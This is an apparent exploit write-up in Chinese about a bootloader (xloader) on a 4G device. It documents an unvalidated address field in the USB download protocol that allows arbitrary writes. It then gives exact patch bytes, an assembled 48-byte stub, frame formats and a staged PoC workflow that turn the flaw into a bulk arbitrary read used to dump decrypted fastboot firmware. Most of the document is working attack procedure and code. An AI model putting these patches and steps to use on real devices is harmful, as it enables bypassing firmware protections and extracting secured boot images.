# xloader 阶段任意读 —— 漏洞定案与利用链

日期：2026-09-09
目标：BD 4G xloader（`PLAIN_BD_4G_xloader.bin`，0x30000，Thumb-2）
结论：**能。漏洞是下载协议 HEAD 帧的地址字段完全不校验（任意写原语），用它给运行中的 xloader 打 3 处补丁 + 48 字节桩，即可把 CD 查询帧变成 1024 B/帧的任意读。**

---

## 0. 一句话结论

| 项 | 结论 |
|---|---|
| 漏洞 | `HEAD` 帧的 32 位 ADDRESS 字段无任何校验 → `memcpy(ADDRESS + n*1024, 帧载荷, len)` |
| 触发条件 | xloader 进入下载模式（USB 已枚举、帧处理器在跑），无需认证、无需 OTP/SEB |
| 升级路径 | 该写原语可写 xloader 自己的 SRAM 代码 → 运行时自补丁（不需要重加密镜像） |
| 读带宽 | 桩装好后 **1024 B / CD 帧**（4.6 MB ≈ 4500 帧；按 10 ms/帧约 45 s） |
| 备选读 | 只补 getter 字面量（数据补丁，无 I-cache 风险）→ 1 B / CD 帧 |

---

## 1. 漏洞本体（代码级）

### 1.1 HEAD 帧解析：地址无校验

处理器 `0x33AFA..0x33B8C`（真实内存地址，见 §2）：

```
ldrb.w r1, [r4,#0x3DB]        ; FILE_TYPE，检查 ∈ {1,2}
...
; 大端拼出 LENGTH → ctx+0x9E0，ADDRESS → ctx+0x9DC 与 ctx+0x9F4
str.w  r3, [r4,#0x9E0]        ; LENGTH
str.w  r2, [r4,#0x9DC]        ; ADDRESS   ← 无任何范围/白名单比较
str.w  r2, [r4,#0x9F4]
```
检查项只有：SEQ==0、帧长==14、FILE_TYPE∈{1,2}。**没有** BootROM 那样的 `cmp #0x22000` 白名单，也没有旧代实现的 0x07 地址错误应答。

### 1.2 DATA 帧写入：目的地址 = HEAD.ADDRESS + n*1024

`0x33C1C..0x33C2E`：

```
ldr.w r3, [r4,#0x9DC]         ; ADDRESS
ldr.w r0, [r4,#0x9E8]         ; 已收帧数
addw  r2, r4, #0x3DB          ; src = 帧载荷
add.w r0, r3, r0, lsl #10     ; dst = ADDRESS + n*1024
mov   r3, r1                  ; len = 本帧载荷长度
bl    #0x23BFC                ; memcpy_s(dst, dest_max=len, src, len)
```

`memcpy_s`（`0x23BFC`）的尺寸参数就是 `len` 本身（`cmp r3,r1` 恒不触发），因此**边界检查形同虚设**。地址 0、长度 0 会被拒；其它一律照写。

### 1.3 可利用性

- xloader 运行在 SRAM（镜像 0x23014..0x52000），SRAM 可写 → 可以改自己的代码/数据。
- 全镜像与 BootROM 均**无任何 `mcr/mrc p15`**（无 MMU/缓存维护指令）→ 判定运行在 MMU/缓存关闭态，**运行时改代码不需要 cache flush**。
- 下载会话不要求 TAIL 收尾：HEAD 帧不检查会话状态，可以 `HEAD+DATA` 反复用（每次重置状态机），不会触发收尾后的校验/跳转流程。

---

## 2. 关键前提修正：镜像基址是 0x23014，不是 0x23000

这是本次分析最重要的发现，也是历史多次"补丁全 ACK 但探针 none / 补丁后设备哑"的根因。

**镜像内部所有数据指针都比"文件偏移 + 0x23000"高 0x14。** 五条独立证据，第 5 条是决定性的：

1. **统计证据**：1369 个字符串里，839 个存在等于 `(文件偏移+0x23000)+0x14` 的字面量；其它偏移命中数只有个位数。
2. **描述符自洽**：镜像头 `+0x04 = 0x23154`。在 +0x14 模型下它正好指向入口跳板（文件 0x140）；在 0x23000 模型下它指向 `b .` 陷阱。
3. **CRC 表位置**：设备查表用的字面量是 `0x45D28`。文件里标准 CCITT 表（0000,1021,2042,…）**唯一**出现在文件 0x22D14。只有基址 0x23014 能让 `0x45D28` 落在表首。
4. **实机行为**：v62b 日志显示，**未打补丁时 CD 应答 = 00**。CD 应答必须先通过 CRC 校验；主机用的是 `crc_hqx`（标准表）。若基址是 0x23000，设备读到的表是 `std[5..]`，校验必然失败、不会有任何应答。实测有应答 ⇒ 基址必为 **0x23014**。
5. **ROM 校准（决定性，零基址歧义）**：BootROM 原地执行（文件偏移=内存地址），其同源 CRC 循环在 **0x4BD2** 用 `movw r4,#0xEDD4` 装表基址，而全 ROM **唯一**一份标准 CCITT 表恰好位于 **0xEDD4** —— 证明这族代码的约定是"字面量 = std[0] 表首"。把它套到 xloader：字面量 `0x45D28` 要指向 std[0]，则基址 = `0x45D28 − 0x22D14` = **0x23014**，与其它证据完全一致。
   （勘误：`_agent_xl/PROTOCOL.md` §1 所记 ROM 字面量 "0xEDD8" 系误读，实为 0xEDD4；也正因这个 4 字节偏差，当时把 4G 的 +0x14 异常误判成了"dump 期产物"。）

**因此：真实内存地址 = 文件偏移 + 0x23014。**

历史补丁地址全部低了 0x14：

| 历史写法 | 真实地址 | 说明 |
|---|---|---|
| getter 字面量 `0x4115C` | **0x41170** | 历史写入落在 getter 前面的函数体里 → 完全无效 |
| `ldrb→ldr` `0x41156` | 0x4116A | |
| `strb.w` `0x33AAA` | 0x33ABE | |
| `movs r2,#1`(len) `0x33AAE` | 0x33AC2 | |
| CD getter 调用 `0x33AA4` | **0x33AB8** | |

v62b 日志正好印证：打完 `0x4115C` 后 `1B probes: 00 | 00 | ...`——**没有任何变化**。

---

## 3. 利用链（3 处补丁 + 48 字节桩）

### 3.1 桩代码（装在镜像尾部零填充区 0x51EC0，48 字节）

镜像 0x51EB8..0x52000 是 328 字节全零、且无任何代码引用（已扫描确认），是理想的落脚点。

```asm
; 入口约定（CD 处理器内调用）：r4 = ctx，sb = ctx+0x3D8（收帧缓冲）
push.w {r4,r5,r6,r7,r8,sb,sl,fp,lr}
adr    r5, cursor          ; r5 = &cursor（紧跟桩尾）
ldr    r6, [r5]            ; 游标 = 目标地址
mov    r0, sb              ; dest
mov    r1, r6              ; src
mov.w  r2, #0x400          ; len = 1024
bl     #0x23B76            ; memcpy(dest, src, len)   —— xloader 自带
add.w  r6, r6, #0x400
str    r6, [r5]            ; 游标 += 1024
mov    r0, r4              ; ctx
mov    r1, sb              ; buf
mov.w  r2, #0x400
bl     #0x346F4            ; usb_send(ctx, buf, 1024)
pop.w  {r4,r5,r6,r7,r8,sb,sl,fp,pc}
.align 2
cursor: .word <目标地址>   ; 初始游标（小端）
```

汇编结果（48 B，keystone 0.9.2，已用 capstone 反汇编逐条复核）：

```
2de9f04f 09a5 2e68 4846 3146 4ff48062 d1f751fe
06f58066 2e60 2046 4946 4ff48062 e2f707fc bde8f08f 00bf <cursor:LE u32>
```

### 3.2 三处补丁

| # | 地址 | 原指令 | 新字节 | 含义 |
|---|---|---|---|---|
| A | 0x33AB8 | `bl 0x41168`（getter） | `1e f0 02 fa` | `bl 0x51EC0` → 改调桩 |
| B | 0x33ABE | `strb.w r0,[r4,#0x3D8]` | `00 bf 00 bf` | 两条 nop → 防止发送期间回写缓冲首字节 |
| C | 0x33AC6 | `bl 0x346F4`（发 1 字节） | `00 f0 2c b9` | `b.w 0x33D22`（函数尾声）→ 抑制多余的 1 字节应答 |

补丁后的 CD 路径（已反汇编验证）：

```
0x33AA8: ldr.w r3,[r4,#0x9f0]      ; （原样，log/计数）
0x33AB8: bl    #0x51EC0            ; ★ 桩：复制 1KB 到 sb 并发送
0x33ABC: mov   r1, sb
0x33ABE: nop   / nop               ; ★ 原 strb 被抹掉
0x33AC2: movs  r2,#1
0x33AC4: mov   r0, r4
0x33AC6: b.w   #0x33D22            ; ★ 直接返回，不再发 1 字节
```

### 3.3 分阶段上机流程（PoC 已实现，每步可观察、可中止）

```
probe     纯数据探测：写 getter 字面量候选 = 0x23014 → CD 应答判别基址模型
          写 0x41170 → 应答 0x01 = NEW 模型（预期）
          写 0x4115C → 应答 0x34 = OLD 模型（回退）
          0x00       = 该候选不是字面量
selftest  probe + 写桩 + getter 逐字节读回验证：
          ① 桩头 4B 应为 2D E9 F0 4F（push.w）
          ② 补丁点 A 原始字节应为 0D F0 56 FB
arm       selftest + 三处代码补丁（先用安全游标 0x23014 试读，不碰 DDR）
scan/dump arm 后写游标到目标地址，CD 每帧回 1024 B
restore   三处补丁点写回原始字节 + getter 字面量恢复 0x60014088
```

模型探测的安全性：先试 NEW 候选（0x41170）。命中则**零损伤**完成判别；只有在
未命中时才试 OLD 候选（0x4115C），此时若真实模型是 NEW，会写坏 getter 前面
4 字节池数据（getter 本身与 CD 路径不受影响，CD 仍回 0x00，可识别）。

### 3.4 帧序列（每条 HEAD 后跟一条 DATA；不发 TAIL）

| 步骤 | 帧 | ADDR | LEN | 载荷 |
|---|---|---|---|---|
| 1 | HEAD+DATA | 0x51EC0 | 48 | 桩（含初始游标） |
| 2 | HEAD+DATA | 0x33AB8 | 4 | `1e f0 02 fa` |
| 3 | HEAD+DATA | 0x33ABE | 4 | `00 bf 00 bf` |
| 4 | HEAD+DATA | 0x33AC6 | 4 | `00 f0 2c b9` |
| 5+ | INQUIRE（CD） | — | — | 每次回 **1024 B**，游标自动 +1024 |

HEAD 帧格式：`[FE][00][FF][01][LEN u32 BE][ADDR u32 BE][CRC16 BE]`（CRC-16/XMODEM，`binascii.crc_hqx`）。
DATA 帧：`[DA][seq][~seq][payload][CRC16 BE]`，seq 从 1 开始。

### 3.5 自检（已内建在 selftest/arm 流程中）

把初始游标设为 **0x23014**（镜像自身起点，内容已知 = `01 00 00 00 54 31 02 00 …`）。
第一条 CD 应返回以 `0100000054310200` 开头的 1024 B → 证明写原语 + 桩 + 回读全链路正确，且不依赖 DDR 是否已初始化。

---

## 4. fastboot 明文目标地址

| 候选 | 依据 |
|---|---|
| **0x1A400000** | 现有链把加密 fastboot 上传到此；5G 同源代码的 cmd2 = "UFS+TEE 解密到 0x1A400000"；v62b 的 dump 基址 |
| 0x3A400000 | v145 注释"fastboot 解密进 DDR 0x3A400000"；fastboot ELF 的 vaddr |
| 0x1A000000 | v62b 的备用 aim 目标 |

**策略**：桩装好后先读 0x23014 自检，再把游标改到候选地址各读 4 KB，按 `7f 45 4c 46`（ELF）、`0d 00 00 14`（AArch64 向量表）、`fastboot`/`oem unlock` 等特征定位，然后连续 dump。
修改游标只需一条 `HEAD(0x51EEC,4)+DATA`（4 字节小端）——不需要重装桩。

---

## 5. 风险与回退

| 风险 | 说明 | 应对 |
|---|---|---|
| 写错地址 | 写未映射地址会硬 fault → USB 掉线 | 只写已知 SRAM 地址；先自检 |
| 桩/补丁写坏 | CD 路径异常、设备无响应 | 掉电重启即恢复（xloader 在 SRAM，断电不保留） |
| DDR 未初始化时读 DDR | fault | 先读 SRAM 自检；DDR 地址仅在 UCE/解密完成后读 |
| I-cache | 镜像与 ROM 均无 p15 维护指令 → 判定缓存关闭 | 若代码补丁无效，回退到"只补 getter 字面量（数据）"的 1 B/帧路径 |
| 会话状态 | HEAD 不检查会话 → 可反复 HEAD+DATA；不发 TAIL 即不触发收尾校验 | 需要恢复干净状态时补发 TAIL 或掉电 |

**回退路径（1 B/帧）**：只做 `HEAD(0x41170,4)+DATA(LE 目标地址)`，然后 CD 每帧回 1 字节。
纯数据补丁，不受缓存/执行权限影响；缺点是 4.6 MB 需要约 460 万帧，仅用于验证与定点读取。

---

## 6. 与历史工作的关系

- 下载协议本身此前已由 `_agent_xl/PROTOCOL.md` 完整逆向（含"ADDRESS 完全不校验"的结论），但**没有把它当作自补丁原语使用**——历史尝试走的是 FPB/DM 外部调试通道，且补丁地址差了 0x14。
- 本次新增的三点：(1) 基址 0x23014 的定案与证据链；(2) 用写原语在 SRAM 内装桩实现批量读；(3) 三处补丁的精确字节与已汇编验证的桩。
- 历史 `v62b_final.py` 的 `harvest_fastboot` 依赖 `bug2_write(0x5C3FC)` + 16 B/帧的 DM walk，最终产物 `FASTBOOT_4G_PLAIN_FINAL.bin` 为 0 字节（未成功）。本方案不依赖 DM/FPB。

---

## 7. 复现清单

1. 进入 xloader 下载模式（现有链路：舞步 → 喂 BD xloader → 等重枚举）。
2. `python z_ar_read.py probe` —— 纯数据判别基址模型（NEW=0x01 / OLD=0x34），不动任何代码。
3. `python z_ar_read.py selftest` —— 装桩 + getter 读回验证（桩头 / 补丁点原始字节）。
4. `python z_ar_read.py scan` —— arm 后扫候选地址找 fastboot 明文。
5. `python z_ar_read.py dump 0x1A400000 0x474000` —— 连续 dump 到文件。
6. 校验：ELF 头 / `fastboot` / `oem unlock` / `userlock` 字符串；`restore` 可随时解除补丁。
